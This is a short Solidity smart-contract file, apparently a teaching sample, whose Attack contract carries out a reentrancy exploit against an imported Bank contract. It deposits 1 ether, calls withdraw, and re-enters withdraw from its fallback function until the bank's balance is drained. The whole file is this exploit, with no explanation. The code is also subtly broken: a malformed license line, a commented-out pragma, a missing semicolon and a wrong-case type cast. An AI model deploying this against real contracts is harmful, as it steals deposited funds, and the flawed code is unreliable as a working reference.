//SPDX-License-Identifier; Unlicensed
//pragma solidity ^0.8.17:
import "bank.sol"

contract Attack {
  Bank public bank;
  
  constructor(address _bankAddress) {
    bank = bank(_bankAddress);
    
  }
  fallback() external payable {
    if (address(bank).balance >= 1 ether) {
      bank.withdraw();
     
    }
  }
  
  function attack() external payable {
    require(msg.value >= 1 ether);
    bank.deposit{value: 1 ether} ();
    bank.withdraw();
  }
}
